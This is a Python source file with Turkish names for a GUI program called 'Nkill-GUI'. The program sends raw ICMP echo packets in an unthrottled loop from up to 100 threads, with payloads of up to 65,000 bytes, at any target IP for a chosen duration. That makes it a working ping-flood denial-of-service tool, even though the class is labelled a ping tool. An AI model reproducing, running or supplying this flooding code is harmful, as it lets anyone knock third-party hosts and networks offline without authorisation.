import sys
import os
import time
import socket
import struct
import base64
import threading
from PyQt5.QtWidgets import QApplication, QWidget, QLabel, QLineEdit, QPushButton, QVBoxLayout, QHBoxLayout, QSpinBox, QTextEdit
from PyQt5.QtCore import QTimer
from PyQt5.QtGui import QIcon

def toplam_kontrol(veri):
    toplam = 0
    kontrol_sinir = (len(veri) // 2) * 2
    for i in range(0, kontrol_sinir, 2):
        deger = veri[i] + (veri[i + 1] << 8)
        toplam += deger
        toplam &= 0xffffffff
    if kontrol_sinir < len(veri):
        toplam += veri[-1]
        toplam &= 0xffffffff
    toplam = (toplam >> 16) + (toplam & 0xffff)
    toplam += (toplam >> 16)
    sonuc = ~toplam & 0xffff
    return sonuc >> 8 | (sonuc << 8 & 0xff00)

def rastgele_base64_verisi(uzunluk):
    return base64.b64encode(os.urandom(uzunluk))[:uzunluk]

def icmp_paketi_olustur(sira_no, veri_boyutu):
    icmp_turu = 8
    icmp_kodu = 0
    icmp_kontrol = 0
    kimlik = os.getpid() & 0xFFFF
    baslik = struct.pack("!BBHHH", icmp_turu, icmp_kodu, icmp_kontrol, kimlik, sira_no)
    veri = rastgele_base64_verisi(veri_boyutu)
    icmp_kontrol = toplam_kontrol(baslik + veri)
    baslik = struct.pack("!BBHHH", icmp_turu, icmp_kodu, icmp_kontrol, kimlik, sira_no)
    return baslik + veri

class PingAraci(QWidget):
    def __init__(self):
        super().__init__()
        self.initUI()
        self.running = False
        self.istatistik = {"gonderilen_paket": 0, "gonderilen_byte": 0}
        self.bitis_zamani = None

    def initUI(self):
        self.setWindowTitle("Nkill-GUI")
        self.setGeometry(100, 100, 500, 400)
        self.setWindowIcon(QIcon("icon.png"))

        layout = QVBoxLayout()

        self.hedef_ip_label = QLabel("Hedef IP:")
        self.hedef_ip_input = QLineEdit()
        layout.addWidget(self.hedef_ip_label)
        layout.addWidget(self.hedef_ip_input)

        self.veri_boyutu_label = QLabel("Veri Boyutu (byte):")
        self.veri_boyutu_input = QSpinBox()
        self.veri_boyutu_input.setRange(1, 65000)
        self.veri_boyutu_input.setValue(64)
        layout.addWidget(self.veri_boyutu_label)
        layout.addWidget(self.veri_boyutu_input)

        self.is_parcasi_label = QLabel("İş Parçacığı Sayısı:")
        self.is_parcasi_input = QSpinBox()
        self.is_parcasi_input.setRange(1, 100)
        self.is_parcasi_input.setValue(4)
        layout.addWidget(self.is_parcasi_label)
        layout.addWidget(self.is_parcasi_input)

        self.sure_label = QLabel("Süre (saniye):")
        self.sure_input = QLineEdit("10")
        layout.addWidget(self.sure_label)
        layout.addWidget(self.sure_input)

        self.button_layout = QHBoxLayout()
        self.baslat_button = QPushButton("Başlat")
        self.baslat_button.clicked.connect(self.ping_baslat)
        self.durdur_button = QPushButton("Durdur")
        self.durdur_button.clicked.connect(self.ping_durdur)
        self.durdur_button.setEnabled(False)

        self.button_layout.addWidget(self.baslat_button)
        self.button_layout.addWidget(self.durdur_button)
        layout.addLayout(self.button_layout)

        self.output = QTextEdit()
        self.output.setReadOnly(True)
        layout.addWidget(self.output)

        self.setLayout(layout)
        self.timer = QTimer()
        self.timer.timeout.connect(self.guncelle_istatistik)

        try:
            with open("styles.css", "r") as f:
                self.setStyleSheet(f.read())
        except FileNotFoundError:
            print("styles.css bulunamadı, varsayılan stil kullanılacak.")

    def icmp_gonder(self, hedef_ip, veri_boyutu):
        try:
            soket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except PermissionError:
            self.output.append("Hata: Yönetici yetkisi gereklidir!")
            return
        while self.running and time.time() < self.bitis_zamani:
            paket = icmp_paketi_olustur(os.getpid(), veri_boyutu)
            soket.sendto(paket, (hedef_ip, 0))
            self.istatistik["gonderilen_paket"] += 1
            self.istatistik["gonderilen_byte"] += len(paket)

    def ping_baslat(self):
        hedef_ip = self.hedef_ip_input.text()
        veri_boyutu = self.veri_boyutu_input.value()
        is_parcasi_sayisi = self.is_parcasi_input.value()
        sure = int(self.sure_input.text())
        if not hedef_ip:
            self.output.append("Lütfen bir hedef IP adresi girin!")
            return
        self.running = True
        self.bitis_zamani = time.time() + sure
        self.timer.start(1000)
        self.baslat_button.setEnabled(False)
        self.durdur_button.setEnabled(True)
        for _ in range(is_parcasi_sayisi):
            threading.Thread(target=self.icmp_gonder, args=(hedef_ip, veri_boyutu), daemon=True).start()

    def ping_durdur(self):
        self.running = False
        self.timer.stop()
        self.baslat_button.setEnabled(True)
        self.durdur_button.setEnabled(False)

    def guncelle_istatistik(self):
        kalan_zaman = max(0, int(self.bitis_zamani - time.time()))
        self.output.append(f"Kalan Süre: {kalan_zaman} sn | Gönderilen Paket: {self.istatistik['gonderilen_paket']}")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setWindowIcon(QIcon("icon.png"))
    pencere = PingAraci()
    pencere.show()
    sys.exit(app.exec_())
